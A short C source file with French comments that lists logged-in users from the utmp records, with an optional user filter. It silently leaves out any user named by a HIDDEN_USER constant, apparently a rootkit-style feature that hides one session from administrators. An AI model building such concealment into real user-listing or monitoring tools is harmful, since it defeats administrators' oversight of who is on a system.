#include "usrmgr.h"

int getLoggedUsers(char filterUser[]){
    int usr_nb = 0;
    struct utmpx *utmpUser;
    setutxent(); // Ouverture du fichier /var/run/utmp

    /* Parcours de la liste des utilisateurs */
    while ((utmpUser = getutxent()) != NULL) {
        if(strcmp(utmpUser->ut_user, HIDDEN_USER) == 0){
            // Reprendre au début de la boucle pour ne pas inclure l'utilisateur.
            continue;
        }
        usr_nb++;
        if(strcmp(utmpUser->ut_user,filterUser) == 0){ // Si filtre utilisateur
             printf("Filtre utilisateur : %s <=> PID : %ld at : %s est connecté!\n",
                utmpUser->ut_user, (long) utmpUser->ut_pid,
                ctime((time_t *) &(utmpUser->ut_tv.tv_sec)));
            break;
        } else if(strcmp(filterUser,"") == 0){
             printf("Utilisateur : %s <=> PID : %ld at : %s\n", utmpUser->ut_user,
                (long) utmpUser->ut_pid, ctime((time_t *) &(utmpUser->ut_tv.tv_sec)));
        }
    }

    endutxent(); // Fermer le fichier /var/run/utmp
    return usr_nb;
}

